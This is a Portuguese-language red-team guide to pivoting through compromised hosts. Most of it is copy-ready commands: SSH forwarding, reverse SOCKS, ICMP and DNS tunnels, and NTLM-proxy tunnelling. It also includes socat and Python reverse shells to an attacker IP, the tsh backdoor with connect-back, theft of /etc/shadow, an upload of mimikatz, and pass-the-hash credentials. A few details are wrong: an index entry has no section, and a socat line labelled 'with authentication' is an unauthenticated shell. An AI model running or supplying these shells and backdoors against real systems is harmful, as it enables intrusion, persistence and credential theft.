# Guia Completo de Pivoting para Red Teamers

## Índice
1. [Introdução](#introdução)
2. [Cenário 1: Alvo com IP Público](#cenário-1-alvo-com-ip-público)
3. [Cenário 2: NAT e Firewall](#cenário-2-nat-e-firewall)
4. [Cenário 3: Exfiltração de Rede Interna](#cenário-3-exfiltração-de-rede-interna)
5. [Cenário 4: Proxy Corporativo](#cenário-4-proxy-corporativo)
6. [Ferramentas e Utilitários](#ferramentas-e-utilitários)
7. [Melhorando a Experiência do Shell](#melhorando-a-experiência-do-shell)

---

## Introdução

Pivoting é o conjunto de técnicas utilizadas durante engajamentos de red team/pentest que empregam hosts controlados pelo atacante como saltos lógicos de rede. O objetivo principal é amplificar a visibilidade da rede e alcançar segmentos que não seriam acessíveis diretamente.

Este guia cobre cenários comuns e técnicas avançadas para pivotar em diferentes ambientes.

---

## Cenário 1: Alvo com IP Público

Neste cenário, você encontrou um bug de RCE em um aplicativo web acessível pela internet e já possui um shell no servidor. O servidor tem conectividade direta com sua máquina de ataque.

### Encaminhamento de Portas SSH

**Cenário Base:**
- Alvo: `203.0.113.10` (público)
- Credenciais SSH: `user:password123`
- Rede interna alvo: `192.168.1.0/24`

#### SOCKS Proxy Dinâmico

```bash
# Cria um proxy SOCKS na porta 1080
ssh user@203.0.113.10 -D 1080

# Teste o proxy com curl
curl --socks5 127.0.0.1:1080 http://192.168.1.100

# Use com nmap via proxychains
proxychains nmap -sT -Pn -p 80,443 192.168.1.0/24
```

#### Encaminhamento de Porta Específica

```bash
# Encaminha RDP (3389) para máquina interna
ssh user@203.0.113.10 -L 33389:192.168.1.50:3389

# Agora conecte-se ao RDP localmente
xfreerdp /v:127.0.0.1:33389 /u:Administrator

# Encaminha SMB (445)
sudo ssh user@203.0.113.10 -L 445:192.168.1.10:445

# Acesse compartilhamentos SMB
smbclient //127.0.0.1/share -U domain/user
```

#### Múltiplos Encaminhamentos

```bash
# Encaminha múltiplas portas simultaneamente
ssh -L 33389:192.168.1.50:3389 -L 8080:192.168.1.100:8080 -L 5432:192.168.1.200:5432 user@203.0.113.10

# Formato compacto com -N (não executa shell)
ssh -N -L 33389:192.168.1.50:3389 user@203.0.113.10
```

### VPN sobre SSH (TUN/TAP)

**Requisitos:**
- Root em ambas as máquinas
- OpenSSH 4.3+
- `/etc/ssh/sshd_config` configurado

**Configuração do Servidor:**
```bash
# Editar /etc/ssh/sshd_config
PermitRootLogin yes
PermitTunnel yes
# Reiniciar SSH
systemctl restart sshd
```

**Conexão VPN:**
```bash
# No cliente (máquina atacante)
ssh -w any:any root@203.0.113.10

# Configurar interfaces (Cliente)
ip addr add 10.10.10.2/32 peer 10.10.10.1 dev tun0
ip link set tun0 up

# Configurar interfaces (Servidor)
ip addr add 10.10.10.1/32 peer 10.10.10.2 dev tun0
ip link set tun0 up
```

**Roteamento e NAT:**
```bash
# No servidor, ativar roteamento
echo 1 > /proc/sys/net/ipv4/ip_forward

# Configurar NAT
iptables -t nat -A POSTROUTING -s 10.10.10.2 -o eth0 -j MASQUERADE
iptables -A FORWARD -i tun0 -j ACCEPT

# No cliente, adicionar rotas
route add -net 192.168.1.0/24 gw 10.10.10.1

# Scan completo com nmap (sem proxychains)
nmap -sS -Pn 192.168.1.0/24
```

### 3proxy - Proxy Multiplataforma

**Instalação no Linux:**
```bash
wget https://github.com/z3APA3A/3proxy/archive/refs/tags/0.9.4.tar.gz
tar -xzf 0.9.4.tar.gz
cd 3proxy-0.9.4
make -f Makefile.Linux
```

**Configuração Básica (`3proxy.cfg`):**
```ini
# Servidor SOCKS5 na porta 1080
socks -p1080

# Autenticação básica
users admin:CL:password123
socks -p1080 -uadmin -p password123

# Proxy HTTP na porta 8080
proxy -p8080

# Encaminhamento de porta TCP
tcppm 3306 192.168.1.100 3306
tcppm 5432 192.168.1.200 5432

# Limite de conexões
maxconn 100
```

**Execução:**
```bash
# Linux
./3proxy 3proxy.cfg

# Windows
3proxy.exe 3proxy.cfg

# Como serviço
nohup ./3proxy 3proxy.cfg &
```

### Ferramenta: rpivot (Reverse SOCKS)

**Instalação:**
```bash
git clone https://github.com/klsecservices/rpivot.git
cd rpivot
```

**Uso Básico:**
```bash
# Servidor (máquina atacante)
python server.py --proxy-port 1080 --server-port 9999 --server-ip 0.0.0.0

# Cliente (máquina comprometida)
python client.py --server-ip 203.0.113.50 --server-port 9999

# Agora o proxy SOCKS está disponível em 127.0.0.1:1080
```

---

## Cenário 2: NAT e Firewall

Aqui, o servidor comprometido está atrás de NAT e apenas portas específicas são acessíveis externamente.

### SSH Reverse Port Forwarding com 3proxy

**Arquitetura:**
- Atacante: `203.0.113.50` (público)
- Alvo: `10.0.0.5` (atrás de NAT)

**Configuração no Alvo (Windows/Linux):**
```bash
# Criar arquivo de configuração 3proxy
echo "socks -p31337" > 3proxy.cfg

# Iniciar 3proxy
./3proxy 3proxy.cfg
```

**Configuração no Atacante:**
```bash
# Criar usuário dedicado
adduser sshproxy
# Editar /etc/passwd - mudar shell para /bin/false
sshproxy:x:1000:1001:,,,:/home/sshproxy:/bin/false

# Configurar autenticação
passwd sshproxy
# Definir senha forte
```

**Conexão Reversa:**
```bash
# Linux - no alvo
ssh -R 31337:127.0.0.1:31337 sshproxy@203.0.113.50

# Windows - com plink
plink.exe sshproxy@203.0.113.50 -R 31337:127.0.0.1:31337

# Opções adicionais úteis
ssh -R 31337:127.0.0.1:31337 -N -f sshproxy@203.0.113.50
```

### rpivot para Ambientes com NAT

**Servidor (Atacante):**
```bash
python server.py --proxy-port 1080 --server-port 9999 --server-ip 0.0.0.0
```

**Cliente (Alvo atrás de NAT):**
```bash
python client.py --server-ip 203.0.113.50 --server-port 9999
```

**Resultado:** Proxy SOCKS4 disponível no atacante em `127.0.0.1:1080`

### Túnel ICMP com Hans

**Características:**
- Funciona onde ICMP é permitido
- Velocidade moderada
- Requer root

**Servidor (Atacante):**
```bash
# Instalação
wget http://code.gerade.org/hans/hans-0.4.1.tar.gz
tar -xzf hans-0.4.1.tar.gz
cd hans-0.4.1
make

# Iniciar servidor
./hans -v -f -s 10.10.10.1 -p MyPassword123

# ou com verbose e foreground
./hans -v -f -s 10.10.10.1 -p MyPassword123 -f
```

**Cliente (Alvo):**
```bash
# Cliente Linux
./hans -f -c 203.0.113.50 -p MyPassword123 -v

# Verificar conectividade
ping 10.10.10.1

# Agora use o túnel
ssh root@10.10.10.1
```

**Roteamento via Túnel ICMP:**
```bash
# No atacante, configurar NAT
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 10.10.10.0/30 -o eth0 -j MASQUERADE

# No alvo, adicionar rota
route add -net 192.168.1.0/24 gw 10.10.10.1

# Testar acesso
ping 192.168.1.1
```

### Túnel DNS com Iodine

**Requisitos:**
- Domínio registrado
- Zona DNS configurada
- Root em ambas as máquinas

**Configuração DNS:**
```
# Registrar NS record
tunnel.domain.com. IN NS ns1.tunnel.domain.com.

# Registrar A record para o nameserver
ns1.tunnel.domain.com. IN A 203.0.113.50
```

**Servidor (Atacante):**
```bash
# Instalação
apt-get install iodine  # ou compile do source

# Iniciar servidor
iodined -f -c -P MyPassword123 10.10.10.1 tunnel.domain.com

# Verificar
ifconfig dns0
ping 10.10.10.2
```

**Cliente (Alvo):**
```bash
# Cliente Linux
iodine -f -P MyPassword123 tunnel.domain.com -r

# Testar conectividade
ping 10.10.10.1

# Usar SSH comprimido
ssh -o CompressionLevel=9 -C -c blowfish-cbc,arcfour user@10.10.10.1 -D 1080
```

### Túnel DNS com Dnscat2

**Características:**
- Não requer root
- Suporte a Windows e Linux
- Suporte a port forwarding

**Servidor (Atacante):**
```bash
# Instalação
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
gem install bundler
bundle install

# Iniciar servidor
ruby ./dnscat2.rb tunnel.domain.com
```

**Cliente (Alvo):**
```bash
# Linux
./dnscat2 tunnel.domain.com

# Windows
dnscat2.exe tunnel.domain.com
```

**Gerenciando Sessões:**
```bash
# Listar sessões ativas
dnscat2> windows

0 :: main [active]
  dns1 :: DNS Driver running on 0.0.0.0:53 domains = tunnel.domain.com [*]
  1 :: command session (debian)
  2 :: sh (debian) [*]

# Selecionar sessão
dnscat2> session -i 1
New window created: 1

# Comandos disponíveis na sessão
command session (debian) 1> help
```

**Port Forwarding via Dnscat2:**
```bash
# Encaminhar porta da rede interna
command session (debian) 1> listen 127.0.0.1:8080 192.168.1.100:80

# Encaminhar RDP
command session (debian) 1> listen 33389 192.168.1.50:3389

# Agora acesse localmente
curl http://127.0.0.1:8080
xfreerdp /v:127.0.0.1:33389
```

---

## Cenário 4: Proxy Corporativo

### rpivot com Autenticação NTLM

**Servidor (Atacante):**
```bash
python server.py --proxy-port 1080 --server-port 9999 --server-ip 0.0.0.0
```

**Cliente (Ambiente Corporativo):**

Com senha:
```bash
python client.py --server-ip 203.0.113.50 --server-port 9999 \
--ntlm-proxy-ip 10.0.0.10 --ntlm-proxy-port 8080 \
--domain CONTOSO.COM --username Alice --password P@ssw0rd
```

Com hashes NTLM:
```bash
python client.py --server-ip 203.0.113.50 --server-port 9999 \
--ntlm-proxy-ip 10.0.0.10 --ntlm-proxy-port 8080 \
--domain CONTOSO.COM --username Alice \
--hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```

### Cntlm - NTLM Authentication Proxy

**Configuração (`cntlm.conf`):**
```ini
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080

# Tunelamento para SSH
Tunnel 2222:203.0.113.50:443

# Múltiplos túneis
Tunnel 33389:203.0.113.50:443
Tunnel 8080:203.0.113.50:80
```

**Execução:**
```bash
# Windows
cntlm.exe -c cntlm.conf

# Linux
./cntlm -c cntlm.conf -f  # -f para foreground

# Verificar autenticação
curl -x 127.0.0.1:3128 http://example.com
```

**Uso com SSH:**
```bash
# Conectar-se através do túnel Cntlm
ssh -p 2222 user@127.0.0.1

# Agora use o proxy SOCKS
ssh -D 1080 user@127.0.0.1 -p 2222
```

### OpenVPN sobre HTTP Proxy

**Configuração (`client.ovpn`):**
```ini
client
dev tun
proto tcp
remote 203.0.113.50 443
resolv-retry infinite
nobind
persist-key
persist-tun
auth-user-pass credentials.txt

# Configuração do proxy HTTP com NTLM
http-proxy 10.0.0.10 8080 credentials.txt ntlm

ca ca.crt
cert client.crt
key client.key
comp-lzo
verb 3
```

**Arquivo de Credenciais (`credentials.txt`):**
```
Alice
P@ssw0rd
```

**Execução:**
```bash
# Iniciar cliente OpenVPN (requer root)
openvpn --config client.ovpn

# Verificar interface
ifconfig tun0

# Roteamento automático
route add -net 192.168.1.0/24 gw tun0
```

---

## Ferramentas e Utilitários

### Proxychains - Forçando Programas via Proxy

**Configuração (`/etc/proxychains.conf`):**
```ini
# Definir lista de proxies
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4 127.0.0.1 1080
socks5 127.0.0.1 1080

# Opções de cadeia
# dynamic_chain - tenta cada proxy sequencialmente
# strict_chain - deve usar todos os proxies na ordem
# random_chain - proxy aleatório
dynamic_chain

# DNS via proxy (desabilitar para DNS interno)
proxy_dns
```

**Resolução DNS Personalizada (`/usr/lib/proxychains3/proxyresolv`):**
```bash
#!/bin/sh
# Personalizar servidor DNS
DNS_SERVER=${PROXYRESOLV_DNS:-192.168.1.10}  # DC da rede interna

if [ $# = 0 ] ; then
    echo "  usage:"
    echo "      proxyresolv <hostname> "
    exit
fi
```

**Exemplos de Uso:**
```bash
# Scan de rede interno
proxychains nmap -sT -Pn -p 445,3389,22 192.168.1.0/24

# RDP através de proxy
proxychains xfreerdp /v:192.168.1.50

# SMB via proxy
proxychains smbclient //192.168.1.10/share

# Uso com impacket
proxychains python3 psexec.py domain/user:pass@192.168.1.10

# MSSQL via proxy
proxychains python3 mssqlclient.py domain/user:pass@192.168.1.100
```

### Socat - O Canivete Suíço

**Bind Shell com Socat:**
```bash
# Servidor (alvo)
socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane

# Cliente (atacante)
socat FILE:`tty`,raw,echo=0 TCP:203.0.113.10:1337
```

**Reverse Shell com Socat:**
```bash
# Servidor (atacante)
socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0

# Cliente (alvo)
socat TCP4:203.0.113.50:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

**Encaminhamento de Porta com Socat:**
```bash
# Encaminhamento simples
socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80

# Túnel SSL
socat OPENSSL-LISTEN:443,cert=server.pem,key=server.key,fork TCP:192.168.1.100:80

# Túnel UDP sobre TCP
socat TCP-LISTEN:53,fork UDP:192.168.1.10:53

# Túnel com autenticação
socat TCP-LISTEN:4444,fork,reuseaddr EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

### Tsh - Backdoor SSH-like

**Configuração (`tsh.h`):**
```c
#ifndef _TSH_H
#define _TSH_H

char *secret = "MySuperSecretKey123";

#define SERVER_PORT 22
short int server_port = SERVER_PORT;

// Configuração para backconnect
#define CONNECT_BACK_HOST  "203.0.113.50"
#define CONNECT_BACK_DELAY 30

#define GET_FILE 1
#define PUT_FILE 2
#define RUNSHELL 3

#endif /* tsh.h */
```

**Compilação:**
```bash
# Linux x86_64
make linux_x64

# Linux i686
make linux_x86

# Windows (com MinGW)
make windows

# Raspberry Pi
make linux_arm
```

**Modo Servidor (Bind):**
```bash
# Iniciar servidor
./tshd

# Conectar ao servidor
./tsh 203.0.113.10

# Comandos disponíveis
help
shell
get /etc/passwd .
put /bin/netcat /tmp
```

**Modo Backconnect:**
```bash
# Atacante escutando
./tsh cb

# Alvo tentando conectar automaticamente a cada 30 segundos
# (configurado no tsh.h)
./tshd

# Agora o atacante tem shell completo
```

**Transferência de Arquivos:**
```bash
# Baixar arquivo do alvo
./tsh 203.0.113.10 get /etc/shadow ./shadow

# Upload de arquivo
./tsh 203.0.113.10 put ./mimikatz.exe /tmp/mimikatz.exe

# Transferência recursiva (diretório)
./tsh 203.0.113.10 get /var/www/html/ ./website/
```

---

## Melhorando a Experiência do Shell

### Python PTY Shell

**Upgrade de Shell Existente:**
```bash
# Em um shell semi-interativo
python -c 'import pty; pty.spawn("/bin/bash")'

# Configurar terminal
export TERM=xterm
stty rows 50 cols 150
```

**Reverse Shell Python com PTY:**
```bash
# No atacante (netcat)
nc -lvp 4444

# No alvo
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("203.0.113.50",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

### Socat Shell Interativo

**Configuração de Terminal Completo:**
```bash
# Atacante escutando com terminal completo
socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0

# Alvo conectando
socat TCP4:203.0.113.50:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

**Ajuste de Tamanho do Terminal:**
```bash
# Verificar tamanho do terminal local
stty -a
# Exemplo: rows 57; columns 211;

# Aplicar no shell socat
stty rows 57 cols 211
```

### Tsh - Shell Completo

```bash
# Conexão tsh
./tsh 203.0.113.10

# Dentro do tsh, usar shell
tsh> shell
$ whoami
$ id
$ exit
tsh> 
```

### Netcat com Terminfo

**Criar terminal totalmente interativo:**
```bash
# No alvo, após obter um shell com nc
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL+Z

# No atacante
stty raw -echo
fg
reset
export SHELL=bash
export TERM=xterm
stty rows 57 cols 211
```

### Script de Upgrade Automático

```bash
#!/bin/bash
# upgrade-shell.sh

echo "[*] Upgrading to fully interactive shell..."
python3 -c 'import pty; pty.spawn("/bin/bash")' 2>/dev/null || \
python -c 'import pty; pty.spawn("/bin/bash")' 2>/dev/null || \
echo "[!] Python not available"

echo "[*] Setting terminal..."
export TERM=xterm-256color
export SHELL=/bin/bash

echo "[*] Done! Press Ctrl+Z then run: stty raw -echo; fg"
```

### Comandos Úteis para Shells Interativos

```bash
# Verificar permissões de shell atual
echo $0
ps -p $$

# Criar shell interativo com script
script /dev/null -c /bin/bash

# Usar bash com job control
bash -i

# Criar novo terminal com screen/tmux
screen -S pentest
tmux new -s pentest

# Editar arquivos remotamente
vim /etc/hosts
nano /tmp/script.sh

# Histórico de comandos
history
cat ~/.bash_history

# Completar caminhos (tab)
# Works in most interactive shells
```

### Dicas para Trabalho Remoto

```bash
# Usar ssh como transporte para ferramentas
ssh -D 1080 user@203.0.113.10

# Configurar browser com proxy SOCKS
# Firefox: about:config -> network.proxy.socks
# Chrome: --proxy-server="socks5://127.0.0.1:1080"

# Usar ferramentas de enumeração via proxy
proxychains bloodhound-python -d domain.local -u user -p pass -c all

# Mapeamento automático de rede via proxy
proxychanes nmap -sT -Pn -p- --min-rate=1000 192.168.1.0/24

# Uso de ferramentas especializadas
proxychains python3 crackmapexec smb 192.168.1.0/24 -u user -p pass
proxychains python3 bloodhound.py -d domain.local -u user -p pass
```

---

## Sumário de Técnicas por Situação

| Cenário | Técnica | Ferramenta | Complexidade |
|---------|---------|------------|--------------|
| IP Público | SOCKS Proxy | SSH -D | Baixa |
| IP Público | Port Forward | SSH -L | Baixa |
| IP Público | VPN TUN | SSH -w | Média |
| NAT | Reverse SOCKS | rpivot | Baixa |
| NAT | Reverse Port | SSH -R + 3proxy | Média |
| Firewall ICMP | ICMP Tunnel | Hans | Média |
| Firewall DNS | DNS Tunnel | Iodine/Dnscat2 | Alta |
| Proxy NTLM | NTLM Proxy | Cntlm/rpivot | Média |
| Proxy HTTP | HTTP Tunnel | OpenVPN | Alta |

---

## Checklist para Pivoting

1. **Reconhecimento inicial**
   - [ ] Identificar interfaces de rede disponíveis
   - [ ] Mapear rotas e gateways
   - [ ] Verificar conectividade com segmentos internos
   - [ ] Listar serviços internos

2. **Seleção de técnica**
   - [ ] Verificar conectividade de saída (TCP/UDP/ICMP/DNS)
   - [ ] Identificar restrições de firewall
   - [ ] Verificar disponibilidade de ferramentas
   - [ ] Avaliar necessidade de root/administrador

3. **Implementação**
   - [ ] Estabelecer canal de comunicação
   - [ ] Configurar proxy ou túnel
   - [ ] Validar roteamento
   - [ ] Testar ferramentas via proxy

4. **Pós-execução**
   - [ ] Automatizar reconexão
   - [ ] Esconder tráfego (túnels encriptados)
   - [ ] Monitorar estabilidade
   - [ ] Documentar configurações

---

## Referências e Recursos

- [3proxy Manual](https://3proxy.ru/howtoe.asp)
- [rpivot GitHub](https://github.com/klsecservices/rpivot)
- [Hans ICMP Tunnel](http://code.gerade.org/hans/)
- [Iodine DNS Tunnel](https://code.kryo.se/iodine/)
- [Dnscat2](https://github.com/iagox86/dnscat2)
- [Cntlm](https://cntlm.sourceforge.net/)
- [Socat Manual](http://www.dest-unreach.org/socat/)
